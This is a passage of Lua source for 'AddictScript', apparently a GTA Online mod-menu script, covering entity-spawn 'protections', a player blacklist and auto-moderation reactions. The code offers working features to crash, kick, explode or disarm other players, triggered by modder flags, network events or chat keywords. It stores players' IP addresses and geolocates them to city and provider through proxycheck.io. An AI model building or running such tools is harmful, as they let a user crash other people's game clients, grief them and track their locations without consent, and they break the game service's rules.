feature["Session Info Window Line R"] = menu.add_feature("Line R", "autoaction_value_i", localparents["Session Info Window"].id, function(f)
end)
feature["Session Info Window Line R"].max = 255
feature["Session Info Window Line R"].min = 0
feature["Session Info Window Line R"].mod = 5
feature["Session Info Window Line R"].value = 10

feature["Session Info Window Line G"] = menu.add_feature("Line G", "autoaction_value_i", localparents["Session Info Window"].id, function(f)
end)
feature["Session Info Window Line G"].max = 255
feature["Session Info Window Line G"].min = 0
feature["Session Info Window Line G"].mod = 5
feature["Session Info Window Line G"].value = 10

feature["Session Info Window Line B"] = menu.add_feature("Line B", "autoaction_value_i", localparents["Session Info Window"].id, function(f)
end)
feature["Session Info Window Line B"].max = 255
feature["Session Info Window Line B"].min = 0
feature["Session Info Window Line B"].mod = 5
feature["Session Info Window Line B"].value = 10

feature["Session Info Window Line A"] = menu.add_feature("Line A", "autoaction_value_i", localparents["Session Info Window"].id, function(f)
end)
feature["Session Info Window Line A"].max = 255
feature["Session Info Window Line A"].min = 0
feature["Session Info Window Line A"].mod = 5
feature["Session Info Window Line A"].value = 255

localparents["Protections"] = menu.add_feature("Protections", "parent", localparents["Online"].id)

feature["Block Scripted Peds"] = menu.add_feature("Block Scripted Peds", "toggle", localparents["Protections"].id, function(f)
	local Whitelist = {}
	while f.on do
		if network.is_session_started() and not script_func.is_loading_into_session() then
			if interior.get_interior_from_entity(player.get_player_ped(player.player_id())) == 0 then
				local peds = ped.get_all_peds()
				for i = 1, #peds do
					local cur_ped = peds[i]
					if not network.has_control_of_entity(cur_ped) then
						if memory.is_script_entity(cur_ped) and not ped.is_ped_a_player(cur_ped) then
							if streaming.is_model_a_ped(entity.get_entity_model_hash(cur_ped)) and entity.is_an_entity(cur_ped) then
								if entity.get_entity_coords(cur_ped).z > 0 and ui.get_blip_from_entity(cur_ped) == 0 then
									local IsWhitelisted = false
									for i = 1, #Whitelist do
										if Whitelist[i] == cur_ped then
											IsWhitelisted = true
										end
									end
									if not IsWhitelisted then
										local EntityOwner = memory.get_entity_owner(cur_ped)
										local Entity = cur_ped
										if EntityOwner ~= nil and EntityOwner ~= player.player_id() then
											if player.is_player_valid(EntityOwner) then
												if not (feature["Whitelist Friends From Protections"].on and player.is_player_friend(EntityOwner)) and not (feature["Whitelist Whitelisted Players From Protections"].on and not player.can_player_be_modder(EntityOwner)) then
													if utilities.request_control(cur_ped, 500) then
														entity_func.hard_remove_entity(cur_ped)
													else
														entity_func.delete_locally(cur_ped)
													end
													menu.notify("Blocked scripted ped spawn attempt by " .. tostring(player.get_player_name(EntityOwner)) .. " (" .. string.format("%x", Entity) .. ")", "AddictScript Protection", 8, NotifyColours["red"])
													Whitelist[#Whitelist + 1] = Entity
													if not AddictScriptIsPlayerTimeout[EntityOwner] and feature["Timeout Time"].value > 0 then
														player_func.timeout_player(EntityOwner, feature["Timeout Time"].value * 1000)
													end
												end
											end
										end
									end
								end
							end
						end
					end
				end
			end
		end
		if script_func.is_loading_into_session() then
			Whitelist = {}
		end
		system.yield(250)
	end
end)

feature["Block Scripted Vehicles"] = menu.add_feature("Block Scripted Vehicles", "toggle", localparents["Protections"].id, function(f)
	local Whitelist = {}
	while f.on do
		if network.is_session_started() and not script_func.is_loading_into_session() then
			if interior.get_interior_from_entity(player.get_player_ped(player.player_id())) == 0 then
				local vehicles = vehicle.get_all_vehicles()
				for i = 1, #vehicles do
					local cur_veh = vehicles[i]
					if not network.has_control_of_entity(cur_veh) then
						if memory.is_script_entity(cur_veh) then
							if streaming.is_model_a_vehicle(entity.get_entity_model_hash(cur_veh)) and entity.is_an_entity(cur_veh) then
								if entity.get_entity_coords(cur_veh).z > 0 and ui.get_blip_from_entity(cur_veh) == 0 then
									local IsWhitelisted = false
									for i = 1, #Whitelist do
										if Whitelist[i] == cur_veh then
											IsWhitelisted = true
										end
									end
									if not IsWhitelisted then
										local EntityOwner = memory.get_entity_owner(cur_veh)
										local Entity = cur_veh
										if EntityOwner ~= nil and EntityOwner ~= player.player_id() then
											if player.is_player_valid(EntityOwner) then
												if not (feature["Whitelist Friends From Protections"].on and player.is_player_friend(EntityOwner)) and not (feature["Whitelist Whitelisted Players From Protections"].on and not player.can_player_be_modder(EntityOwner)) then
													if utilities.request_control(cur_veh, 500) then
														entity_func.hard_remove_entity(cur_veh)
													else
														entity_func.delete_locally(cur_veh)
													end
													menu.notify("Blocked scripted vehicle spawn attempt by " .. tostring(player.get_player_name(EntityOwner)) .. " (" .. string.format("%x", Entity) .. ")", "AddictScript Protection", 8, NotifyColours["red"])
													Whitelist[#Whitelist + 1] = Entity
													if not AddictScriptIsPlayerTimeout[EntityOwner] and feature["Timeout Time"].value > 0 then
														player_func.timeout_player(EntityOwner, feature["Timeout Time"].value * 1000)
													end
												end
											end
										end
									end
								end
							end
						end
					end
				end
			end
		end
		if script_func.is_loading_into_session() then
			Whitelist = {}
		end
		system.yield(250)
	end
end)

feature["Block Scripted Objects"] = menu.add_feature("Block Scripted Objects", "toggle", localparents["Protections"].id, function(f)
	local Whitelist = {}
	while f.on do
		if network.is_session_started() and not script_func.is_loading_into_session() then
			if interior.get_interior_from_entity(player.get_player_ped(player.player_id())) == 0 then
				local objects = object.get_all_objects()
				for i = 1, #objects do
					local cur_obj = objects[i]
					if not network.has_control_of_entity(cur_obj) then
						if memory.is_script_entity(cur_obj) then
							if streaming.is_model_an_object(entity.get_entity_model_hash(cur_obj)) and entity.is_an_entity(cur_obj) then
								if entity.get_entity_coords(cur_obj).z > 0 and ui.get_blip_from_entity(cur_obj) == 0 then
									local IsWhitelisted = false
									for i = 1, #Whitelist do
										if Whitelist[i] == cur_obj then
											IsWhitelisted = true
										end
									end
									if not IsWhitelisted then
										local EntityOwner = memory.get_entity_owner(cur_obj)
										local Entity = cur_obj
										if EntityOwner ~= nil and EntityOwner ~= player.player_id() then
											if player.is_player_valid(EntityOwner) then
												if not (feature["Whitelist Friends From Protections"].on and player.is_player_friend(EntityOwner)) and not (feature["Whitelist Whitelisted Players From Protections"].on and not player.can_player_be_modder(EntityOwner)) then
													if utilities.request_control(cur_obj, 500) then
														entity_func.hard_remove_entity(cur_obj)
													else
														entity_func.delete_locally(cur_obj)
													end
													menu.notify("Blocked scripted object spawn attempt by " .. tostring(player.get_player_name(EntityOwner)) .. " (" .. string.format("%x", Entity) .. ")", "AddictScript Protection", 8, NotifyColours["red"])
													Whitelist[#Whitelist + 1] = Entity
													if not AddictScriptIsPlayerTimeout[EntityOwner] and feature["Timeout Time"].value > 0 then
														player_func.timeout_player(EntityOwner, feature["Timeout Time"].value * 1000)
													end
												end
											end
										end
									end
								end
							end
						end
					end
				end
			end
		end
		if script_func.is_loading_into_session() then
			Whitelist = {}
		end
		system.yield(250)
	end
end)

feature["Block Muggers"] = menu.add_feature("Block Muggers", "toggle", localparents["Protections"].id, function(f)
	while f.on do
		if network.is_session_started() then
			if interior.get_interior_from_entity(player.get_player_ped(player.player_id())) == 0 then
				if script_func.get_player_mugger_target() == player.player_id() then
					local peds = ped.get_all_peds()
					for i = 1, #peds do
						local cur_ped = peds[i]
						if not network.has_control_of_entity(cur_ped) then
							if natives.GET_ENTITY_SCRIPT(cur_ped) == "AM_GANG_CALL" or natives.GET_ENTITY_SCRIPT(cur_ped) == "am_gang_call" then
								if utilities.force_request_control(cur_ped) then
									entity_func.hard_remove_entity(cur_ped)
									menu.notify("Blocked mugger spawn attempt (" .. string.format("%x", cur_ped) .. ")", "AddictScript Protection", 8, NotifyColours["red"])
								end
							end
						end
					end
				end
			end
		end
		system.yield(250)
	end
end)
--[[
feature["Block FMM Transaction Error"] = menu.add_feature("Block FMM Transaction Error", "toggle", localparents["Protections"].id, function(f)
	while f.on do
		if network.is_session_started() then
			if natives.GET_NUMBER_OF_REFERENCES_OF_SCRIPT_WITH_NAME_HASH(gameplay.get_hash_key("am_destroy_veh")) > 0 then
				local Entity = ui.get_entity_from_blip(natives.GET_FIRST_BLIP_INFO_ID(225))
				if Entity ~= 0 and Entity ~= nil then
					local script_host = natives.NETWORK_GET_HOST_OF_SCRIPT("am_destroy_veh", -1, 0)
					if not network.has_control_of_entity(Entity) and script_host == player.player_id() then
						if player.is_player_valid(script_host) and script_host ~= -1 then
							fire.add_explosion(entity.get_entity_coords(Entity), 4, false, true, 0.0, 0)
							if utilities.request_control(Entity, 500) then
								entity_func.hard_remove_entity(Entity)
							else
								entity_func.delete_locally(Entity)
							end
							menu.notify("Blocked invalid FMM start attempt by " .. tostring(player.get_player_name(script_host)), "AddictScript Protection", 8, NotifyColours["red"])
							if not AddictScriptIsPlayerTimeout[script_host] and feature["Timeout Time"].value > 0 then
								player_func.timeout_player(script_host, feature["Timeout Time"].value * 1000)
							end
						end
					end
				end
			end
		end
		system.yield(100)
	end
end)
]]
feature["Block Chained Attachments"] = menu.add_feature("Block Chained Attachments", "toggle", localparents["Protections"].id, function(f)
	local Whitelist = {}
	while f.on do
		if network.is_session_started() then
			if interior.get_interior_from_entity(player.get_player_ped(player.player_id())) == 0 then
				local vehicles = vehicle.get_all_vehicles()
				for i = 1, #vehicles do
					local cur_veh = vehicles[i]
					if not network.has_control_of_entity(cur_veh) then
						if entity.get_entity_model_hash(cur_veh) == entity.get_entity_model_hash(entity.get_entity_attached_to(cur_veh)) then
							local is_on = menu.get_feature_by_hierarchy_key("local.player_options.no_ragdoll").on
							menu.get_feature_by_hierarchy_key("local.player_options.no_ragdoll").on = true
							local IsWhitelisted = false
							for i = 1, #Whitelist do
								if Whitelist[i] == cur_veh then
									IsWhitelisted = true
								end
							end
							if not IsWhitelisted then
								local EntityOwner = memory.get_entity_owner(cur_veh)
								local Entity = cur_veh
								if utilities.request_control(cur_veh, 500) then
									entity_func.hard_remove_entity(cur_veh)
								else
									entity_func.delete_locally(cur_veh)
								end
								if EntityOwner ~= nil and EntityOwner ~= player.player_id() then
									if player.is_player_valid(EntityOwner) then
										if not (feature["Whitelist Friends From Protections"].on and player.is_player_friend(EntityOwner)) and not (feature["Whitelist Whitelisted Players From Protections"].on and not player.can_player_be_modder(EntityOwner)) then
											menu.notify("Blocked chained vehicle spawn attempt by " .. tostring(player.get_player_name(EntityOwner)) .. " (" .. string.format("%x", Entity) .. ")", "AddictScript Protection", 8, NotifyColours["red"])
											Whitelist[#Whitelist + 1] = Entity
											if not AddictScriptIsPlayerTimeout[EntityOwner] and feature["Timeout Time"].value > 0 then
												player_func.timeout_player(EntityOwner, feature["Timeout Time"].value * 1000)
											end
										end
									end
								end
							end
							menu.get_feature_by_hierarchy_key("local.player_options.no_ragdoll").on = is_on
						end
					end
				end
			end
		end
		system.yield(100)
	end
end)

feature["Timeout Time"] = menu.add_feature("Timeout Time", "autoaction_value_i", localparents["Protections"].id, function(f)
end)
feature["Timeout Time"].max = 60
feature["Timeout Time"].min = 0
feature["Timeout Time"].mod = 10
feature["Timeout Time"].value = 0

feature["Whitelist Friends From Protections"] = menu.add_feature("Whitelist Friends", "toggle", localparents["Protections"].id, function(f)
end)

feature["Whitelist Whitelisted Players From Protections"] = menu.add_feature("Whitelist Whitelisted Players", "toggle", localparents["Protections"].id, function(f)
end)

localparents["Auto Moderation"] = menu.add_feature("Auto Moderation", "parent", localparents["Online"].id)

local BlacklistFeatures = {}

localparents["Blacklist"] = menu.add_feature("Blacklist", "parent", localparents["Auto Moderation"].id)

localparents["Blacklist Players"] = menu.add_feature("Players", "parent", localparents["Blacklist"].id)

do
	feature["Add Profile"] = menu.add_feature("Add Profile", "action", localparents["Blacklist Players"].id, function(f)
		local realname
		local realscid
		local realip
		local input_stat, input_val = input.get("Enter Name", "", 24, 0)
		while input_stat == 1 do
			system.yield(0)
			input_stat, input_val = input.get("Enter Name", "", 24, 0)
		end
		if input_stat == 2 then
			return HANDLER_POP
		end
		realname = input_val
		local input_stat, input_val = input.get("Enter SCID", "", 24, 3)
		while input_stat == 1 do
			system.yield(0)
			input_stat, input_val = input.get("Enter SCID", "", 24, 3)
		end
		if input_stat == 2 then
			return HANDLER_POP
		end
		realscid = input_val
		local input_stat, input_val = input.get("Enter IP", "", 24, 0)
		while input_stat == 1 do
			system.yield(0)
			input_stat, input_val = input.get("Enter IP", "", 24, 0)
		end
		if input_stat == 2 then
			return HANDLER_POP
		end
		realip = input_val
		if realname ~= nil and realscid ~= nil and realip ~= nil and realname ~= "" and realscid ~= "" and realip ~= "" and string.find(realip, ".") and not string.find(realname, "|") and not string.find(realip, "|") then
			if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Blacklist.txt")) then
				text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Blacklist.txt"), "a"), text_func.generate_random_id() .. "|" .. tostring(realname) .. "|" .. tostring(realscid) .. "|" .. tostring(utilities.ipv4_to_dec(realip)) .. "\n")
				menu.notify("Successfully added profile to blacklist!", AddictScript, 3, NotifyColours["green"])
			end
		end
	end)
	feature["Refresh"] = menu.add_feature("Refresh", "action", localparents["Blacklist Players"].id, function(f)
		for k, v in pairs(BlacklistFeatures) do
			if BlacklistFeatures[k] then
				menu.delete_feature(BlacklistFeatures[k].id)
			end
		end
		system.yield(0)
		local file = io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Blacklist.txt"), "r")
		for line in file:lines() do
			if string.find(line, "|") then
				local parts = text_func.split_string(line, "|")
				local id = parts[1]
				local name = parts[2]
				local scid = parts[3]
				local ip = math.tointeger(parts[4])
				local playerhandle = natives.NETWORK_HANDLE_FROM_USER_ID(tostring(scid), 13)
				local flags = ""
				if natives.NETWORK_CAN_PLAY_MULTIPLAYER_WITH_GAMER(playerhandle) or natives.NETWORK_CAN_GAMER_PLAY_MULTIPLAYER_WITH_ME(playerhandle) or natives._0x021ABCBD98EC4320(playerhandle) or natives._0x421E34C55F125964(playerhandle) or natives.NETWORK_IS_FRIEND_HANDLE_ONLINE(playerhandle) then
					flags = "[O] "
				end
				if natives.NETWORK_IS_FRIEND(playerhandle) then
					if flags ~= "" then
						flags = flags .. "[F] "
					else
						flags = "[F] "
					end
				end
				BlacklistFeatures[id] = menu.add_feature(flags .. tostring(name), "action_value_str", localparents["Blacklist Players"].id, function(f)
					if f.value == 0 then
						menu.notify("Name: " .. name .. "\nSCID: " .. scid .. "\nIP: " .. utilities.dec_to_ipv4(ip) .. "\nFriend: " .. tostring(natives.NETWORK_IS_FRIEND(playerhandle)) .. "\nOnline: " ..  tostring(natives.NETWORK_CAN_PLAY_MULTIPLAYER_WITH_GAMER(playerhandle) or natives.NETWORK_CAN_GAMER_PLAY_MULTIPLAYER_WITH_ME(playerhandle) or natives._0x021ABCBD98EC4320(playerhandle) or natives._0x421E34C55F125964(playerhandle) or natives.NETWORK_IS_FRIEND_HANDLE_ONLINE(playerhandle)), "AddictScript Player Blacklist", 12, NotifyColours["green"])
					elseif f.value == 1 then
						local success, webdata = web.get("https://proxycheck.io/v2/" .. utilities.dec_to_ipv4(ip) .. "?vpn=1&asn=1")
						if string.find(webdata, "ok") then
							local ip_real = utilities.dec_to_ipv4(ip)
							local provider_real = webdata:match("\"provider\":%s*\"([^\"]+)\",")
							local continent_real = webdata:match("\"continent\":%s*\"([^\"]+)\",")
							local country_real = webdata:match("\"country\":%s*\"([^\"]+)\",")
							local region_real = webdata:match("\"region\":%s*\"([^\"]+)\",")
							local city_real = webdata:match("\"city\":%s*\"([^\"]+)\",")
							local proxy_real = webdata:match("\"proxy\":%s*\"([^\"]+)\",")
							local type_real = webdata:match("\"type\":%s*\"([^\"]+)\"")
							menu.notify("IP: " .. tostring(ip_real) .. "\nProvider: " .. tostring(provider_real) .. "\nContinent: " .. tostring(continent_real) .. "\nCountry: " .. tostring(country_real) .. "\nRegion: " .. tostring(region_real) .. "\nCity: " .. tostring(city_real) .. "\nProxy: " .. tostring(proxy_real) .. "\nType: " .. tostring(type_real), "Player IP Info", 24, NotifyColours["green"])
						elseif string.find(webdata, "error") then
							menu.notify("Invalid IP Address!\n" .. utilities.dec_to_ipv4(ip), "Player IP Info", 12, NotifyColours["green"])
						elseif string.find(webdata, "denied") then
							menu.notify("Nooo you reached the max api requests for today :(((((((((((((", AddictScript, 4, NotifyColours["red"])
						end
					elseif f.value == 2 then
						natives.NETWORK_SHOW_PROFILE_UI(playerhandle)
					else
						if BlacklistFeatures[id] then
							menu.delete_feature(BlacklistFeatures[id].id)
						end
						if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Blacklist.txt")) then
							local finalstring = ""
							local file2 = io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Blacklist.txt"), "r")
							for line2 in file2:lines() do
								if not string.find(line2, id) then
									finalstring = finalstring .. line2.. "\n"
								end
							end
							text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Blacklist.txt"), "w"), "")
							if finalstring ~= "" then
								text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Blacklist.txt"), "a"), finalstring)
							end
						end
					end
				end)
				BlacklistFeatures[id]:set_str_data({"Show Info", "IP Info", "View SC Profile", "Remove"})
				system.yield(0)
			end
		end
	end)
	local file = io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Blacklist.txt"), "r")
	for line in file:lines() do
		if string.find(line, "|") then
			local parts = text_func.split_string(line, "|")
			local id = parts[1]
			local name = parts[2]
			local scid = parts[3]
			local ip = math.tointeger(parts[4])
			local playerhandle = natives.NETWORK_HANDLE_FROM_USER_ID(tostring(scid), 13)
			local flags = ""
			if natives.NETWORK_CAN_PLAY_MULTIPLAYER_WITH_GAMER(playerhandle) or natives.NETWORK_CAN_GAMER_PLAY_MULTIPLAYER_WITH_ME(playerhandle) or natives._0x021ABCBD98EC4320(playerhandle) or natives._0x421E34C55F125964(playerhandle) or natives.NETWORK_IS_FRIEND_HANDLE_ONLINE(playerhandle) then
				flags = "[O] "
			end
			if natives.NETWORK_IS_FRIEND(playerhandle) then
				if flags ~= "" then
					flags = flags .. "[F] "
				else
					flags = "[F] "
				end
			end
			BlacklistFeatures[id] = menu.add_feature(flags .. tostring(name), "action_value_str", localparents["Blacklist Players"].id, function(f)
				if f.value == 0 then
					menu.notify("Name: " .. name .. "\nSCID: " .. scid .. "\nIP: " .. utilities.dec_to_ipv4(ip) .. "\nFriend: " .. tostring(natives.NETWORK_IS_FRIEND(playerhandle)) .. "\nOnline: " ..  tostring(natives.NETWORK_CAN_PLAY_MULTIPLAYER_WITH_GAMER(playerhandle) or natives.NETWORK_CAN_GAMER_PLAY_MULTIPLAYER_WITH_ME(playerhandle) or natives._0x021ABCBD98EC4320(playerhandle) or natives._0x421E34C55F125964(playerhandle) or natives.NETWORK_IS_FRIEND_HANDLE_ONLINE(playerhandle)), "AddictScript Player Blacklist", 12, NotifyColours["green"])
				elseif f.value == 1 then
					local success, webdata = web.get("https://proxycheck.io/v2/" .. utilities.dec_to_ipv4(ip) .. "?vpn=1&asn=1")
					if string.find(webdata, "ok") then
						local ip_real = utilities.dec_to_ipv4(ip)
						local provider_real = webdata:match("\"provider\":%s*\"([^\"]+)\",")
						local continent_real = webdata:match("\"continent\":%s*\"([^\"]+)\",")
						local country_real = webdata:match("\"country\":%s*\"([^\"]+)\",")
						local region_real = webdata:match("\"region\":%s*\"([^\"]+)\",")
						local city_real = webdata:match("\"city\":%s*\"([^\"]+)\",")
						local proxy_real = webdata:match("\"proxy\":%s*\"([^\"]+)\",")
						local type_real = webdata:match("\"type\":%s*\"([^\"]+)\"")
						menu.notify("IP: " .. tostring(ip_real) .. "\nProvider: " .. tostring(provider_real) .. "\nContinent: " .. tostring(continent_real) .. "\nCountry: " .. tostring(country_real) .. "\nRegion: " .. tostring(region_real) .. "\nCity: " .. tostring(city_real) .. "\nProxy: " .. tostring(proxy_real) .. "\nType: " .. tostring(type_real), "Player IP Info", 24, NotifyColours["green"])
					elseif string.find(webdata, "error") then
						menu.notify("Invalid IP Address!\n" .. utilities.dec_to_ipv4(ip), "Player IP Info", 12, NotifyColours["green"])
					elseif string.find(webdata, "denied") then
						menu.notify("Nooo you reached the max api requests for today :(((((((((((((", AddictScript, 4, NotifyColours["red"])
					end
				elseif f.value == 2 then
					natives.NETWORK_SHOW_PROFILE_UI(playerhandle)
				else
					if BlacklistFeatures[id] then
						menu.delete_feature(BlacklistFeatures[id].id)
					end
					if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Blacklist.txt")) then
						local finalstring = ""
						local file2 = io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Blacklist.txt"), "r")
						for line2 in file2:lines() do
							if not string.find(line2, id) then
								finalstring = finalstring .. line2.. "\n"
							end
						end
						text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Blacklist.txt"), "w"), "")
						if finalstring ~= "" then
							text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Blacklist.txt"), "a"), finalstring)
						end
					end
				end
			end)
			BlacklistFeatures[id]:set_str_data({"Show Info", "IP Info", "View SC Profile", "Remove"})
		end
	end
end

feature["Blacklist Reaction"] = menu.add_feature("Reaction", "autoaction_value_str", localparents["Blacklist"].id, function(f)
end)
feature["Blacklist Reaction"]:set_str_data({"None", "Script Kick", "Drop Kick"})

localparents["Blacklist Flags"] = menu.add_feature("Flags", "parent", localparents["Blacklist"].id)

feature["Blacklist Matching Name"] = menu.add_feature("Matching Name", "toggle", localparents["Blacklist Flags"].id, function(f)
end)

feature["Blacklist Matching SCID"] = menu.add_feature("Matching SCID", "toggle", localparents["Blacklist Flags"].id, function(f)
end)

feature["Blacklist Matching IP"] = menu.add_feature("Matching IP", "toggle", localparents["Blacklist Flags"].id, function(f)
end)

localparents["Modder Reactions"] = menu.add_feature("Modder Reactions", "parent", localparents["Auto Moderation"].id)

do
	for i = 0, 100 do
		if player.get_modder_flag_text(1 << i) ~= "" then
			feature["Modder Reaction " .. i] = menu.add_feature(player.get_modder_flag_text(1 << i), "value_str", localparents["Modder Reactions"].id, function(f)
				if f.on then
					listeners["Modder Reaction " .. i] = event.add_event_listener("modder", function(modder_player)
						if modder_player.flag == 1 << i then
							if f.value == 0 then
								menu.notify("Player: " .. tostring(player.get_player_name(modder_player.player)) .. "/" .. tostring(player.get_player_scid(modder_player.player)) .. "\nFlag: " .. player.get_modder_flag_text(1 << i) .. "\nReaction: Script Kick", "AddictScript Modder Reaction", 8, NotifyColours["blue"])
								script_func.script_event_kick(modder_player.player)
							elseif f.value == 1 then
								menu.notify("Player: " .. tostring(player.get_player_name(modder_player.player)) .. "/" .. tostring(player.get_player_scid(modder_player.player)) .. "\nFlag: " .. player.get_modder_flag_text(1 << i) .. "\nReaction: Script Crash", "AddictScript Modder Reaction", 8, NotifyColours["blue"])
								script_func.script_event_crash(modder_player.player)
							else
								menu.notify("Player: " .. tostring(player.get_player_name(modder_player.player)) .. "/" .. tostring(player.get_player_scid(modder_player.player)) .. "\nFlag: " .. player.get_modder_flag_text(1 << i) .. "\nReaction: Drop Kick", "AddictScript Modder Reaction", 8, NotifyColours["blue"])
								script_func.drop_kick(modder_player.player)
							end
						end
					end)
				end
				if not f.on then
					if listeners["Modder Reaction " .. i] then
						event.remove_event_listener("modder", listeners["Modder Reaction " .. i])
						listeners["Modder Reaction " .. i] = nil
					end
				end
			end)
			feature["Modder Reaction " .. i]:set_str_data({"Script Kick", "Script Crash", "Drop Kick"})
		end
	end
end

localparents["Net Event Reactions"] = menu.add_feature("Net Event Reactions", "parent", localparents["Auto Moderation"].id)

do
	for i = 0, 87 do
		feature["Net Event Reaction " .. i] = menu.add_feature(NetEventName[i], "value_str", localparents["Net Event Reactions"].id, function(f)
			if f.on then
				eventhooks["Net Event Reaction " .. i] = hook.register_net_event_hook(function(source, target, eventId)
					if eventId == NetEventID[NetEventName[i]] then
						if f.value == 0 then
							menu.notify("Player: " .. tostring(player.get_player_name(source)) .. "/" .. tostring(player.get_player_scid(source)) .. "\nNet Event: " .. NetEventName[eventId] .. "\nReaction: Script Kick", "AddictScript Net Event Reaction", 8, NotifyColours["blue"])
							script_func.script_event_kick(source)
						elseif f.value == 1 then
							menu.notify("Player: " .. tostring(player.get_player_name(source)) .. "/" .. tostring(player.get_player_scid(source)) .. "\nNet Event: " .. NetEventName[eventId] .. "\nReaction: Script Crash", "AddictScript Net Event Reaction", 8, NotifyColours["blue"])
							script_func.script_event_crash(source)
						elseif f.value == 2 then
							menu.notify("Player: " .. tostring(player.get_player_name(source)) .. "/" .. tostring(player.get_player_scid(source)) .. "\nNet Event: " .. NetEventName[eventId] .. "\nReaction: Drop Kick", "AddictScript Net Event Reaction", 8, NotifyColours["blue"])
							script_func.drop_kick(source)
						elseif f.value == 3 then
							menu.notify("Player: " .. tostring(player.get_player_name(source)) .. "/" .. tostring(player.get_player_scid(source)) .. "\nNet Event: " .. NetEventName[eventId] .. "\nReaction: Explode", "AddictScript Net Event Reaction", 8, NotifyColours["blue"])
							fire.add_explosion(player.get_player_coords(source), 59, true, false, 0, player.get_player_ped(player.player_id()))
						else
							menu.notify("Player: " .. tostring(player.get_player_name(source)) .. "/" .. tostring(player.get_player_scid(source)) .. "\nNet Event: " .. NetEventName[eventId] .. "\nReaction: Remove All Weapons", "AddictScript Net Event Reaction", 8, NotifyColours["blue"])
							weapon.remove_all_ped_weapons(player.get_player_ped(source))
						end
					end
				end)
			end
			if not f.on then
				if eventhooks["Net Event Reaction " .. i] then
					hook.remove_net_event_hook(eventhooks["Net Event Reaction " .. i])
					eventhooks["Net Event Reaction " .. i] = nil
				end
			end
		end)
		feature["Net Event Reaction " .. i]:set_str_data({"Script Kick", "Script Crash", "Drop Kick", "Explode", "Remove All Weapons"})
	end
end

local ChatJudgerFeatures = {}

localparents["Chat Judger"] = menu.add_feature("Chat Judger", "parent", localparents["Auto Moderation"].id)

feature["Enable Chat Judger"] = menu.add_feature("Enable", "toggle", localparents["Chat Judger"].id, function(f)
	if f.on then
		listeners["Enable Chat Judger"] = event.add_event_listener("chat", function(message_player)
			if message_player.sender ~= player.player_id() then
				local guilty = false
				local blacklisted = ""
				local file = io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "ChatJudger.txt"), "r")
				for line in file:lines() do
					if string.find(message_player.body:lower(), line:lower()) then
						blacklisted = line
						guilty = true
					end
				end
				if guilty then
					if feature["Chat Judger Reaction"].value == 0 then
						menu.notify("Player: " .. tostring(player.get_player_name(message_player.sender)) .. "/" .. tostring(player.get_player_scid(message_player.sender)) .. "\nMessage: " .. tostring(message_player.body) .. "\nBlacklisted String: " .. tostring(blacklisted), "AddictScript Chat Judger", 12, NotifyColours["blue"])
					elseif feature["Chat Judger Reaction"].value == 1 then
						menu.notify("Kicked Player: " .. tostring(player.get_player_name(message_player.sender)) .. "/" .. tostring(player.get_player_scid(message_player.sender)) .. "\nMessage: " .. tostring(message_player.body) .. "\nBlacklisted String: " .. tostring(blacklisted), "AddictScript Chat Judger", 12, NotifyColours["blue"])
						script_func.script_event_kick(message_player.sender)
					elseif feature["Chat Judger Reaction"].value == 2 then
						menu.notify("Crashed Player: " .. tostring(player.get_player_name(message_player.sender)) .. "/" .. tostring(player.get_player_scid(message_player.sender)) .. "\nMessage: " .. tostring(message_player.body) .. "\nBlacklisted String: " .. tostring(blacklisted), "AddictScript Chat Judger", 12, NotifyColours["blue"])
						script_func.script_event_crash(message_player.sender)
					else
						menu.notify("Kicked Player: " .. tostring(player.get_player_name(message_player.sender)) .. "/" .. tostring(player.get_player_scid(message_player.sender)) .. "\nMessage: " .. tostring(message_player.body) .. "\nBlacklisted String: " .. tostring(blacklisted), "AddictScript Chat Judger", 12, NotifyColours["blue"])
						script_func.drop_kick(message_player.sender)
					end
				end
			end
		end)
	end
	if not f.on then
		if listeners["Enable Chat Judger"] then
			event.remove_event_listener("chat", listeners["Enable Chat Judger"])
			listeners["Enable Chat Judger"] = nil
		end
	end
end)

feature["Chat Judger Reaction"] = menu.add_feature("Reaction", "autoaction_value_str", localparents["Chat Judger"].id, function(f)
end)
feature["Chat Judger Reaction"]:set_str_data({"Notify", "Script Kick", "Script Crash", "Drop Kick"})

localparents["Chat Judger Strings"] = menu.add_feature("Strings", "parent", localparents["Chat Judger"].id)

do
	feature["Add String"] = menu.add_feature("Add String", "action", localparents["Chat Judger Strings"].id, function(f)
		local input_stat, input_val = input.get("", "", 16, 0)
		if input_stat == 1 then
			return HANDLER_CONTINUE
		end
		if input_stat == 2 then
			return HANDLER_POP
		end
		if input_val ~= "" then
			if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "ChatJudger.txt")) then
				text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "ChatJudger.txt"), "a"), tostring(input_val) .. "\n")
				menu.notify("Successfully added string to chat judger!", AddictScript, 3, NotifyColours["green"])
			end
		end
	end)
	feature["Refresh"] = menu.add_feature("Refresh", "action", localparents["Chat Judger Strings"].id, function(f)
		for k, v in pairs(ChatJudgerFeatures) do
			if ChatJudgerFeatures[k] then
				menu.delete_feature(ChatJudgerFeatures[k].id)
			end
		end
		system.yield(0)
		local file = io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "ChatJudger.txt"), "r")
		for line in file:lines() do
			ChatJudgerFeatures[line] = menu.add_feature(tostring(line), "action_value_str", localparents["Chat Judger Strings"].id, function(f)
				if ChatJudgerFeatures[line] then
					menu.delete_feature(ChatJudgerFeatures[line].id)
				end
				system.yield(0)
				if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "ChatJudger.txt")) then
					local finalstring = ""
					local file2 = io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "ChatJudger.txt"), "r")
					for line2 in file2:lines() do
						if not string.find(line2, line) then
